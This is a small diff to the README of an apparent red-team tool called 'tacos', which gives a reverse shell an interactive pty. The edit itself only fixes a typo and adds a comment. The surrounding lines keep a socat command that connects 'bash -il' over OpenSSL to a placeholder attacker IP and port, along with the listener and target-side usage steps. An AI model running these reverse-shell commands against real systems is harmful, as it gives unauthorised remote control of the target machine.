@@ -1,7 +1,7 @@
 # tacos 🌮 
 <sup>(reverse `socat`)</sup>
 
-Spawn a pty in your reverse shell to automaticcaly make it interactive.
+Spawn a pty in your reverse shell to automaticaly make it interactive.
 
 Equivalent of:
 ```shell
@@ -22,7 +22,7 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],v
 ```shell
 # On attacker machine
 tmux
-./light-pty4all/socat-listener.sh --lport [ATTACKER_PORT]
+./light-pty4all/socat-listener.sh --lport [ATTACKER_PORT] #multi-handler
 
 # On target (transfer tacos as you wish)
 ./tacos [ATTACKER_IP]
